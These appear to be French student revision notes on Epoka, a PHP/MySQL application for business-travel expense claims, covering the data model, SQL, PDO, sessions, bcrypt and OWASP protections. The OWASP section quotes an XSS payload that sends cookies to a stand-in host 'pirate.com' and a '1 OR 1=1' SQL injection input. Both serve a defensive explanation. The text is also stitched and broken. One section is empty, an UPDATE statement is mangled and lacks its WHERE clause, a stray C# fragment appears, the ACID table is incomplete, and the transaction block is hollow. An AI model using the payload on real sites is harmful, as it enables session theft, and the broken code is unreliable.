PARTIE 0 — Présentation pour un jury non-expert

Cette section est rédigée sans jargon technique, pour permettre à toute personne — qu'elle soit informaticienne ou non — de comprendre ce qu'est l'application Epoka, pourquoi elle existe, et comment elle fonctionne au quotidien.

À quoi sert Epoka ?

Epoka est un logiciel de gestion des déplacements professionnels. Dans une entreprise, lorsqu'un employé part en mission (visite d'un client, intervention sur site, formation…), il doit déclarer ce déplacement pour être remboursé de ses frais : carburant, hébergement, repas.

Avant ce type de logiciel, tout se faisait sur papier ou par e-mail : l'employé remplissait un formulaire, l'envoyait par mail au responsable, le responsable l'imprimait, le signait, et le transmettait à la comptabilité. Ce processus était lent, source d'erreurs, et difficile à suivre.

Epoka automatise et digitalise ce processus de bout en bout.

Qui utilise l'application ?

Chaque étape est tracée dans le logiciel avec une date. Il est impossible de sauter une étape : on ne peut pas payer une mission qui n'a pas été validée.

Le calcul automatique des frais

Le logiciel calcule automatiquement le montant à rembourser :

  • Frais de trajet = nombre de kilomètres × tarif au km (paramétrable, ex : 0,50 €/km)
  • Frais d'hébergement = nombre de nuits × tarif par nuit (ex : 80 €/nuit)

La base de données mémorise les distances entre les villes déjà utilisées. La prochaine fois que quelqu'un fait le même trajet, le kilométrage est rempli automatiquement.

Le tableau de bord

À la connexion, chaque utilisateur voit un résumé personnalisé : combien de missions il a créées, combien sont en attente de validation, combien ont été payées. Le responsable voit en plus la liste des missions en attente de sa validation, avec un bouton pour les traiter directement.

La gestion du profil

Chaque utilisateur peut personnaliser son profil en ajoutant une photo. En survolant son avatar dans la barre latérale gauche, une icône apparaît pour changer la photo — sans quitter la page, grâce à la technologie AJAX.

En résumé pour le jury : Epoka remplace un processus manuel (papier/email) par une application web sécurisée, accessible depuis n'importe quel ordinateur avec un navigateur, qui guide chaque acteur de l'entreprise dans son rôle et calcule automatiquement les remboursements.

PARTIE 2 — Base de données

Le Modèle Conceptuel de Données (MCD) 1ère année

Avant de créer les tables en SQL, on modélise les données et leurs relations avec un MCD (aussi appelé diagramme Entité-Association). Voici les entités du projet :

  • VILLE : une commune française (nom + code postal)
  • AGENCE : un bureau de l'entreprise, situé dans une ville
  • SALARIÉ : un employé, rattaché à une agence
  • MISSION : un déplacement d'un salarié entre deux villes
  • DISTANCE : le kilométrage mémorisé entre deux villes
  • PARAMETRE : les tarifs (prix/km, prix/nuit)

Cardinalités (règles de gestion) :

RelationCardinalitéSens
AGENCE — VILLEN,1Plusieurs agences peuvent être dans la même ville. Une agence est dans exactement une ville.
SALARIÉ — AGENCEN,1Plusieurs salariés peuvent appartenir à la même agence. Un salarié appartient à 0 ou 1 agence.
MISSION — SALARIÉN,1Un salarié peut avoir plusieurs missions. Chaque mission appartient à un seul salarié.
MISSION — VILLE (départ)N,1Plusieurs missions peuvent partir de la même ville.
MISSION — VILLE (arrivée)N,1Plusieurs missions peuvent arriver à la même ville.

Clés étrangères et intégrité référentielle 1ère année

Une clé étrangère est une contrainte qui garantit qu'une valeur dans une colonne correspond toujours à une valeur existante dans une autre table. Cela s'appelle l'intégrité référentielle.

Requêtes SQL essentielles Les deux années

SELECT avec JOIN

Pour afficher la liste des missions avec le nom du salarié et des villes, on a besoin de jointures. La table mission ne stocke que les IDs ; les noms sont dans d'autres tables.

SELECT m.*,
       s.nom           AS salarie_nom,
       s.prenom        AS salarie_prenom,
       vd.nom          AS ville_depart_nom,
       va.nom          AS ville_arrivee_nom
FROM   mission m
JOIN   salarie s  ON m.id_salarie       = s.id
JOIN   ville   vd ON m.id_ville_depart  = vd.id
JOIN   ville   va ON m.id_ville_arrivee = va.id
ORDER BY m.date_debut DESC;

-- Ici on joint DEUX FOIS la table ville avec deux alias différents (vd et va)
-- car une mission a DEUX villes (départ ET arrivée).
-- JOIN = INNER JOIN : ne retourne que les lignes qui ont une correspondance des deux côtés.

UPDATE mission
SET    statut = 'validee'

SET    statut = 'payee'
WHERE  id = 7
  AND  statut = 'validee';

DELETE FROM mission WHERE id = 7;
-- Grâce à la FK ON DELETE CASCADE, les données liées seront supprimées si nécessaire.

SQL DDL — Définir les données 1ère année

Le DDL (Data Definition Language) regroupe les commandes qui définissent la structure de la base de données (tables, colonnes, contraintes), par opposition au DML (Data Manipulation Language : SELECT/INSERT/UPDATE/DELETE).

CREATE TABLE

CREATE TABLE IF NOT EXISTS mission (
    id               INT            PRIMARY KEY AUTO_INCREMENT,
    intitule         VARCHAR(255)   NOT NULL,
    date_debut       DATE           NOT NULL,
    date_fin         DATE           NOT NULL,
    statut           ENUM('brouillon','validee','payee') DEFAULT 'brouillon',
    id_salarie       INT            NOT NULL,
    id_ville_depart  INT            NOT NULL,
    id_ville_arrivee INT            NOT NULL,
    FOREIGN KEY (id_salarie)       REFERENCES salarie(id) ON DELETE CASCADE,
    FOREIGN KEY (id_ville_depart)  REFERENCES ville(id)   ON DELETE RESTRICT,
    FOREIGN KEY (id_ville_arrivee) REFERENCES ville(id)   ON DELETE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

ALTER TABLE — Modifier une table existante

-- Ajouter une colonne
ALTER TABLE mission ADD COLUMN nb_repas INT DEFAULT 0;

-- Modifier le type d'une colonne
ALTER TABLE salarie MODIFY COLUMN prenom VARCHAR(150) NOT NULL;

-- Supprimer une colonne
ALTER TABLE mission DROP COLUMN nb_repas;

-- Renommer une colonne (MySQL 8+)
ALTER TABLE salarie RENAME COLUMN mot_de_passe TO mdp_hash;

DROP, TRUNCATE

-- Supprimer définitivement une table (structure + données)
DROP TABLE IF EXISTS mission;

-- Vider une table sans la supprimer (plus rapide que DELETE FROM sans WHERE)
TRUNCATE TABLE distance;
-- ⚠ TRUNCATE réinitialise l'AUTO_INCREMENT, DELETE non.

Un SGBD comme MySQL permet de créer des utilisateurs distincts du superadmin et de leur accorder des privilèges précis (principe du moindre privilège).

PARTIE 4 — Configuration et connexion PDO

PDO — PHP Data Objects 2ème année

PDO est l'interface officielle de PHP pour accéder aux bases de données. Elle est indépendante du SGBD (MySQL, PostgreSQL, SQLite…). Son avantage principal : les requêtes préparées qui protègent contre les injections SQL.

$dsn = "mysql:host=127.0.0.1;dbname=epoka;charset=utf8mb4";
// DSN = Data Source Name : chaîne qui identifie la base à laquelle se connecter
// host=127.0.0.1 → serveur local (boucle locale, équivalent de localhost)
// dbname=epoka   → nom de la base de données
// charset=utf8mb4 → encodage de la connexion

$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, // Lance une exception si erreur SQL
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,       // fetch() retourne un tableau associatif
    PDO::ATTR_EMULATE_PREPARES   => false,               // Vraies requêtes préparées MySQL
];

$db = new PDO($dsn, 'root', '', $options);

Le pattern Singleton 2ème année

La connexion à la base est coûteuse en ressources. Le pattern Singleton garantit qu'une seule instance de PDO est créée pour toute la durée d'une requête HTTP :

function getDatabase() {
    static $db = null;  // Variable statique : conservée entre les appels à cette fonction
    if ($db === null) {
        $db = new PDO(...);  // Créée une seule fois
    }
    return $db;             // Toujours la même instance
}

Initialisation automatique de la base

Si les tables n'existent pas encore, la fonction initDatabase() les crée automatiquement. Elle vérifie d'abord l'existence de la table parametre avec SHOW TABLES LIKE 'parametre'. Si elle est absente → toutes les tables sont créées et les données par défaut insérées (admin, Paris, tarifs).

Système de flash messages

Problème : comment afficher "Mission créée !" sur la page liste, alors que la création a eu lieu sur une autre requête HTTP ?

Solution : stocker le message en session avant la redirection, l'afficher à la page suivante, et le supprimer immédiatement après affichage.

function flash($message, $type = 'success') {
    $_SESSION['flash'] = ['message' => $message, 'type' => $type];
}

function getFlash() {
    if (isset($_SESSION['flash'])) {
        $flash = $_SESSION['flash'];
        unset($_SESSION['flash']);  // Suppression immédiate → affiché une seule fois
        return $flash;
    }
    return null;
}

PARTIE 6 — Authentification et sessions

Sessions PHP 2ème année

HTTP est un protocole sans état (stateless) : chaque requête est indépendante, le serveur ne "sait pas" qui envoie la requête. Les sessions permettent de maintenir un état entre les requêtes d'un même utilisateur.

Mécanisme :
1. À la connexion, PHP crée un identifiant de session unique (ex: abc123def456)
2. Cet ID est stocké dans un cookie dans le navigateur (PHPSESSID)
3. À chaque requête suivante, le navigateur envoie ce cookie automatiquement
4. PHP retrouve les données de session correspondantes (fichier serveur temporaire)
5. $_SESSION['salarie_id'] contient l'ID du salarié connecté

Hachage bcrypt 2ème année

Les mots de passe ne sont jamais stockés en clair en base de données. On utilise l'algorithme bcrypt :

// À la création du compte (ou changement de mdp) :
$hash = password_hash('monmotdepasse', PASSWORD_DEFAULT);
// $hash = "$2y$10$Qv8x..." (60 caractères, différent à chaque appel même avec le même mdp)

// À la connexion :
if (password_verify($motDePasseSaisi, $hashEnBase)) {
    // Correct → connexion autorisée
}

        $motDePasse = $_POST['mot_de_passe'] ?? '';

        // 1. Chercher le salarié par ID (numérique, pas de doublon possible)
        $salarie = $this->salarieModel->authenticate($id, $motDePasse);

        if ($salarie) {
            // 2. Stocker les infos en session (jamais le mot de passe !)
            $_SESSION['salarie_id']      = $salarie['id'];
            $_SESSION['peut_valider']    = $salarie['peut_valider'];
            $_SESSION['peut_payer']      = $salarie['peut_payer'];
            // 3. Rediriger vers le tableau de bord
            redirect('dashboard');
        } else {
            // 4. Identifiants incorrects → message d'erreur générique
            flash('Identifiants incorrects.', 'error');
            // Message volontairement vague : ne révèle pas si c'est l'ID ou le mdp qui est faux

saveKm() — méthode privée utilitaire

Cette méthode effectue un upsert (contraction de "update or insert") : si la paire de villes est nouvelle → insertion ; si elle existe déjà et le km a changé → mise à jour ; sinon → rien.

private function saveKm($idVilleDepart, $idVilleArrivee, $km) {
    if ($km <= 0) return;           // Pas de km saisi → ne rien faire
    $existing = $distModel->getDistance($idVilleDepart, $idVilleArrivee);
    if (!$existing) {
        $distModel->create(...);     // Paire inconnue → créer
    } elseif ((int)$existing['km'] !== $km) {
        $distModel->update(...);     // km différent → mettre à jour
    }
    // km identique → rien à faire (évite une écriture inutile en BDD)
}

PARTIE 13 — Sécurité web (OWASP)

2ème année

L'OWASP (Open Web Application Security Project) publie régulièrement le "Top 10" des vulnérabilités web les plus répandues. Epoka protège contre les principales :

A1 — Injection SQL

Attaque : Si l'ID envoyé est 1 OR 1=1, une requête non sécurisée "SELECT * FROM salarie WHERE id = $id" deviendrait WHERE id = 1 OR 1=1 et retournerait TOUS les salariés.
Protection dans Epoka : Toutes les requêtes avec des données utilisateur utilisent des requêtes préparées PDO avec ?. PDO échappe automatiquement les valeurs. 
// DANGEREUX (jamais fait dans Epoka) :
$db->query("SELECT * FROM salarie WHERE id = $id");

// SÉCURISÉ :
$stmt = $db->prepare("SELECT * FROM salarie WHERE id = ?");
$stmt->execute([$id]);  // PDO échappe $id, quelle que soit sa valeur

A3 — XSS (Cross-Site Scripting)

Attaque : Un utilisateur enregistre un intitulé de mission : <script>document.location='http://pirate.com?cookie='+document.cookie</script>. Sans protection, ce script s'exécuterait dans le navigateur de tous ceux qui voient la liste.
Protection dans Epoka : escape() → htmlspecialchars() est appelé sur toutes les variables affichées.

A5 — Contrôle d'accès défaillant (IDOR)

Attaque IDOR : L'utilisateur #5 modifie l'URL ?action=edit&id=12 pour accéder à la mission de l'utilisateur #8.
Protection dans Epoka : Le contrôleur vérifie que $mission['id_salarie'] == $_SESSION['salarie_id'] avant tout accès à une ressource d'un autre salarié.

A7 — Authentification défaillante

Protections dans Epoka :
  • Mots de passe hashés avec bcrypt (pas de stockage en clair)
  • Message d'erreur générique ("Identifiants incorrects") — ne révèle pas si l'ID ou le mdp est faux
  • Connexion par ID numérique unique (clé primaire) — pas de doublon possible comme avec les noms
  • requireLogin() au début de chaque action protégée

Upload de fichier sécurisé

Protections dans Epoka :
  • Validation MIME avec finfo : lire les octets magiques du fichier — l'extension peut mentir, pas les octets
  • Taille limitée à 2 Mo
  • Nom de fichier contrôlé : {id_salarie}.{ext} — impossible de faire du path traversal (../../config.php)
  • Dossier séparé (assets/img/avatars/) — hors de la portée du code PHP

Deux clés liées mathématiquement : clé publique (partagée librement) et clé privée (secrète). Ce qui est chiffré avec l'une ne peut être déchiffré qu'avec l'autre.

Analogie : La clé publique est une boîte aux lettres ouverte à tous. N'importe qui peut y glisser un message (chiffrer). Seul le propriétaire de la clé privée peut l'ouvrir.

Fonctions de hachage

Une fonction de hachage est à sens unique : on ne peut pas retrouver l'entrée à partir de la sortie. Elle produit une empreinte (digest) de taille fixe.

AlgorithmeSortieSécurité
MD5128 bits (32 hex)Compromis — ne pas utiliser pour les mdp
SHA-1160 bits (40 hex)Compromis — obsolète
SHA-256256 bits (64 hex)Sûr pour l'intégrité (checksums)
SHA-512512 bits (128 hex)Sûr, plus coûteux
bcrypt60 caractèresSpécifique mots de passe : lent + sel
MD5 ne protège pas les mots de passe ! Les tables rainbow précalculent les hashes MD5 de millions de mots courants. Une recherche Google de 5f4dcc3b5aa765d61d8327deb882cf99 révèle immédiatement "password". bcrypt est résistant car son coût de calcul est configurable.

Signature numérique

La signature numérique garantit l'authenticité (c'est bien l'expéditeur) et l'intégrité (le message n'a pas été modifié).

        conn.Open();
        using var r = cmd.ExecuteReader();

END//

Transactions — Propriétés ACID

Une transaction groupe plusieurs requêtes en une opération atomique : soit tout réussit (COMMIT), soit tout est annulé (ROLLBACK). Indispensable pour maintenir la cohérence des données.

Propriétés ACID

PropriétéSignificationExemple
A — AtomicitéTout ou rien : si une opération échoue, tout est annuléVirement bancaire : débit ET crédit, sinon ni l'un ni l'autre
C — CohérenceLa base reste dans un état valide avant et aprèsContraintes FK respectées après la transaction
I — IsolationLes transactions concurrentes n'interfèrent pas entre ellesDeux users modifient simultanément — chacun voit un état cohérent

START TRANSACTION;

UPDATE mission SET statut = 'validee' WHERE id = 7 AND statut = 'brouillon';

IF ROW_COUNT() = 1 THEN

ELSE

END IF;
